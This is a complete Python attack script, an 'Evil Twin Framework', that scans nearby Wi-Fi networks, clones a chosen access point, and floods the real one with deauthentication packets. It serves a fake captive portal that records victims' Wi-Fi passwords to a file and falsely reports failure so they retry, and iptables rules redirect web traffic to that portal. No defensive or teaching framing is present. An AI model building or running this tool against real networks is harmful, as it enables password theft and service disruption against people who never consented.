#!/usr/bin/env python3
import subprocess
import os
import time
import re
from datetime import datetime
import threading
import random
import signal
import sys
import hashlib

class EvilTwinFramework:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.ap_interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.processes = []
        self.captured_passwords = []
        self.dhcp_range = "192.168.1.100,192.168.1.200"
        self.gateway_ip = "192.168.1.1"
        self.dns_ip = "192.168.1.1"
        
    def check_requirements(self):
        required = {
            'airmon-ng': 'aircrack-ng',
            'airodump-ng': 'aircrack-ng',
            'airbase-ng': 'aircrack-ng',
            'hostapd': 'hostapd',
            'dnsmasq': 'dnsmasq',
            'iptables': 'iptables',
        }
        missing = []
        for tool, package in required.items():
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            except:
                missing.append(f"{tool} ({package})")
        return missing
    
    def get_interfaces(self):
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'wlan' in line.lower() or 'wlp' in line.lower():
                    match = re.search(r'\d+:\s+([^:]+):', line)
                    if match:
                        interfaces.append(match.group(1).strip())
            return interfaces
        except:
            return []
    
    def enable_monitor_mode(self, interface):
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if 'monitor mode' in line.lower() and 'enabled' in line.lower():
                    match = re.search(r'(wlan\d+mon|mon\d+|wlp\S+mon)', line)
                    if match:
                        self.monitor_interface = match.group(1)
                        return True
            self.monitor_interface = f"{interface}mon"
            return True
        except:
            return False
    
    def scan_networks(self, duration=20):
        print(f"\033[93m[*] Scanning networks ({duration}s)...\033[0m\n")
        
        scan_file = f"/tmp/scan_{int(time.time())}"
        cmd = ['airodump-ng', self.monitor_interface, '-w', scan_file, '--output-format', 'csv']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.processes.append(proc)
        
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
        
        networks = []
        try:
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='latin-1') as f:
                    content = f.read()
                
                lines = content.split('\n')
                in_ap_section = False
                
                for line in lines:
                    if 'BSSID' in line and 'PWR' in line:
                        in_ap_section = True
                        continue
                    elif 'Station MAC' in line:
                        break
                    
                    if in_ap_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14 and ':' in parts[0]:
                            bssid = parts[0]
                            channel = parts[3]
                            encryption = parts[5]
                            essid = parts[13]
                            
                            if essid and bssid and channel.isdigit():
                                networks.append({
                                    'bssid': bssid,
                                    'channel': channel,
                                    'encryption': encryption,
                                    'essid': essid
                                })
                
                for f in [f"{scan_file}-01.csv", f"{scan_file}-01.cap"]:
                    if os.path.exists(f):
                        os.remove(f)
        except:
            pass
        
        return networks
    
    def create_evil_twin(self, essid, channel, encryption='WPA2'):
        print(f"\n\033[93m[*] Creating Evil Twin: {essid}\033[0m")
        print(f"\033[93m[*] Channel: {channel}\033[0m\n")
        
        hostapd_conf = f"/tmp/hostapd_{int(time.time())}.conf"
        dnsmasq_conf = f"/tmp/dnsmasq_{int(time.time())}.conf"
        
        with open(hostapd_conf, 'w') as f:
            f.write(f"""interface={self.monitor_interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=3
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
""")
        
        subprocess.run(['ip', 'addr', 'add', f'{self.gateway_ip}/24', 'dev', self.monitor_interface],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', 'dev', self.monitor_interface, 'up'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        with open(dnsmasq_conf, 'w') as f:
            f.write(f"""interface={self.monitor_interface}
dhcp-range={self.dhcp_range},12h
dhcp-option=3,{self.gateway_ip}
dhcp-option=6,{self.dns_ip}
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
""")
        
        hostapd_cmd = ['hostapd', hostapd_conf]
        hostapd_proc = subprocess.Popen(hostapd_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(hostapd_proc)
        
        time.sleep(3)
        
        dnsmasq_cmd = ['dnsmasq', '-C', dnsmasq_conf, '-d']
        dnsmasq_proc = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(dnsmasq_proc)
        
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
    
    def deauth_attack(self, target_bssid, duration=60):
        print(f"\n\033[93m[*] Deauth attack on {target_bssid} ({duration}s)\033[0m\n")
        
        end_time = time.time() + duration
        
        while time.time() < end_time:
            cmd = ['aireplay-ng', '--deauth', '0', '-a', target_bssid, self.monitor_interface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                proc.kill()
    
    def setup_captive_portal(self):
        portal_dir = '/tmp/evil_portal'
        os.makedirs(portal_dir, exist_ok=True)
        
        html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>WiFi Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
               min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); 
                    max-width: 400px; width: 90%; }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; font-size: 14px; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 2px solid #e0e0e0; border-radius: 5px; 
               font-size: 14px; transition: border 0.3s; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .spinner { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; 
                  width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>Network Authentication Required</h1>
        <p>Please enter your WiFi password to continue</p>
        <form id="authForm" method="POST" action="/auth">
            <input type="password" name="password" id="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
        <div class="spinner" id="spinner"></div>
    </div>
    <script>
        document.getElementById('authForm').onsubmit = function(e) {
            e.preventDefault();
            document.getElementById('spinner').style.display = 'block';
            setTimeout(() => {
                fetch('/auth', {
                    method: 'POST',
                    body: new FormData(document.getElementById('authForm'))
                }).then(() => {
                    document.querySelector('.container').innerHTML = '<h1>Connecting...</h1><p>Please wait</p><div class="spinner" style="display:block"></div>';
                    setTimeout(() => {
                        document.querySelector('.container').innerHTML = '<h1>Authentication Failed</h1><p>Incorrect password. Please try again.</p>';
                        setTimeout(() => location.reload(), 3000);
                    }, 3000);
                });
            }, 1000);
        };
    </script>
</body>
</html>'''
        
        with open(f'{portal_dir}/index.html', 'w') as f:
            f.write(html_content)
        
        server_script = f'{portal_dir}/server.py'
        with open(server_script, 'w') as f:
            f.write('''#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
from datetime import datetime

PORT = 80
captured_file = '/tmp/captured_passwords.txt'

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('/tmp/evil_portal/index.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(302)
            self.send_header('Location', 'http://192.168.1.1/')
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/auth':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            params = urllib.parse.parse_qs(post_data.decode('utf-8'))
            password = params.get('password', [''])[0]
            
            with open(captured_file, 'a') as f:
                f.write(f"{datetime.now()}: {password}\\n")
            
            print(f"[+] Captured: {password}")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')

os.chdir('/tmp/evil_portal')
with socketserver.TCPServer(("", PORT), CaptivePortalHandler) as httpd:
    print(f"Captive portal running on port {PORT}")
    httpd.serve_forever()
''')
        
        os.chmod(server_script, 0o755)
        
        proc = subprocess.Popen(['python3', server_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(proc)
        
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', 
                       '-j', 'DNAT', '--to-destination', f'{self.gateway_ip}:80'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', 
                       '-j', 'DNAT', '--to-destination', f'{self.gateway_ip}:80'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
    
    def monitor_captures(self, duration=300):
        print(f"\n\033[92m[+] Evil Twin active!\033[0m")
        print(f"\033[97m[*] Monitoring for {duration}s...\033[0m")
        print(f"\033[97m[*] Press Ctrl+C to stop\033[0m\n")
        
        captured_file = '/tmp/captured_passwords.txt'
        end_time = time.time() + duration
        last_size = 0
        
        while time.time() < end_time:
            if os.path.exists(captured_file):
                current_size = os.path.getsize(captured_file)
                if current_size > last_size:
                    with open(captured_file, 'r') as f:
                        lines = f.readlines()
                        new_lines = lines[-(current_size - last_size)//50:]
                        for line in new_lines:
                            if line.strip():
                                print(f"\033[92m[+] Captured: {line.strip()}\033[0m")
                    last_size = current_size
            
            time.sleep(5)
    
    def cleanup(self):
        print(f"\n\033[93m[*] Cleaning up...\033[0m")
        
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        subprocess.run(['iptables', '-t', 'nat', '-F'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['airmon-ng', 'stop', self.monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['killall', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['killall', 'hostapd'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run():
    print("\033[92m" + "="*70)
    print("     EVIL TWIN FRAMEWORK")
    print("="*70 + "\033[0m\n")
    
    framework = EvilTwinFramework()
    
    def signal_handler(sig, frame):
        framework.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    missing = framework.check_requirements()
    if missing:
        print(f"\033[91m[!] Missing: {', '.join(missing)}\033[0m")
        return
    
    interfaces = framework.get_interfaces()
    if not interfaces:
        print("\033[91m[!] No wireless interfaces\033[0m")
        return
    
    print("\033[97mInterfaces:\033[0m")
    for i, iface in enumerate(interfaces, 1):
        print(f"  [{i}] {iface}")
    
    choice = input("\n\033[95m[?] Select: \033[0m").strip()
    try:
        idx = int(choice) - 1
        selected = interfaces[idx]
    except:
        print("\033[91m[!] Invalid\033[0m")
        return
    
    print(f"\n\033[93m[*] Enabling monitor mode...\033[0m")
    if not framework.enable_monitor_mode(selected):
        print("\033[91m[!] Failed\033[0m")
        return
    
    print(f"\033[92m[+] Monitor: {framework.monitor_interface}\033[0m")
    
    networks = framework.scan_networks(20)
    
    if not networks:
        print("\033[91m[!] No networks\033[0m")
        framework.cleanup()
        return
    
    print("\033[92m" + "="*70)
    print("  #  |      BSSID       | CH |         ESSID")
    print("="*70 + "\033[0m")
    
    for i, net in enumerate(networks[:20], 1):
        print(f"\033[97m {i:2d}  | {net['bssid']} | {net['channel']:2s} | {net['essid'][:30]}\033[0m")
    
    target = input("\n\033[95m[?] Target #: \033[0m").strip()
    try:
        idx = int(target) - 1
        selected_net = networks[idx]
    except:
        print("\033[91m[!] Invalid\033[0m")
        framework.cleanup()
        return
    
    framework.target_bssid = selected_net['bssid']
    framework.target_essid = selected_net['essid']
    framework.target_channel = selected_net['channel']
    
    print("\n\033[97mAttack mode:\033[0m")
    print("  [1] Evil Twin with Captive Portal")
    print("  [2] Evil Twin with Deauth")
    print("  [3] Both")
    
    mode = input("\n\033[95m[?] Select: \033[0m").strip()
    
    framework.create_evil_twin(framework.target_essid, framework.target_channel)
    
    if mode in ['1', '3']:
        framework.setup_captive_portal()
    
    if mode in ['2', '3']:
        threading.Thread(target=framework.deauth_attack, 
                        args=(framework.target_bssid, 300), daemon=True).start()
    
    framework.monitor_captures(300)
    framework.cleanup()

if __name__ == "__main__":
    run()
